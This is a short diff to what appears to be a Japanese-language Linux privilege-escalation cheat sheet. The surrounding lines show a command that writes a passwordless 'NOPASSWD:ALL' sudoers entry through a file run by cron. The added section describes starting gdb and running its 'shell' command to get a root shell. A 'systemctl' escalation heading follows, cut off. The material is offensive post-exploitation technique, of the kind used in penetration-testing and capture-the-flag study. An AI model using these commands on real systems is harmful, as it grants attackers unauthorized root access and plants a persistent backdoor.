@@ -20,6 +20,16 @@
     echo 'echo "vuln ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > <cronに使用されているファイル>
 ```
 
+## gdbで権限昇格
+
+``` shell
+    # gdb起動
+    gdb
+    help shell
+    # shell実行でroot権限でshellを実行できる。
+    shell
+```
+
 ## systemctlで権限昇格
 
 ``` shell
